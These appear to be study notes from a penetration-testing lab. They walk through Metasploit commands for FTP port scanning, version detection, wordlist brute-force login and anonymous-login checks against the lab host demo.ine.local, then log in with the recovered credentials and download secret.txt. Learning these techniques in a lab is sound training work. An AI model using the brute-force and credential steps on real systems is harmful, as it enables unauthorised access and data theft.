FTP is file transfer protocol hosted on port 21
used to facilitate file sharing between a server and client/clients

can download files from web server to your local system and vice versa

we can use brute force to login to ftp server

```
service postgresql start
ifconfig
msfconsole
msf6 > workspace -a FTP_ENUM
msf6 > workspace

msf6 > search portscan
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS demo.ine.local
msf6 auxiliary(scanner/portscan/tcp) > back

#FTP version scanner
msf6 > search ftp
msf6 > search type:auxiliary name:ftp
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > show options   
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS demo.ine.local
msf6 auxiliary(scanner/ftp/ftp_version) > run
msf6 auxiliary(scanner/ftp/ftp_version) > search ProFTPD
msf6 auxiliary(scanner/ftp/ftp_version) > back

#FTP brute force
msf6 > search type:auxiliary name:ftp
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(scanner/ftp/ftp_login) > show options
msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS demo.ine.local
msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/ftp/ftp_login) > run
msf6 auxiliary(scanner/ftp/ftp_login) > ftp demo.ine.local 
you will now be promped to enter right username and password

#anonymous FTP login
msf6 > search type:auxiliary name:ftp
msf6 auxiliary(scanner/ftp/anonymous) > show options
msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS demo.ine.local
msf6 auxiliary(scanner/ftp/anonymous) > run
[*] demo.ine.local:21     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ftp/anonymous) > exit

#FTP server login
┌──(root㉿INE)-[~]
└─# ftp demo.ine.local   
Name (demo.ine.local:root): sysadmin
Password : 654321
ftp> ls
ftp> get secret.txt
┌──(root㉿INE)-[~]
└─# cat secret.txt 
```

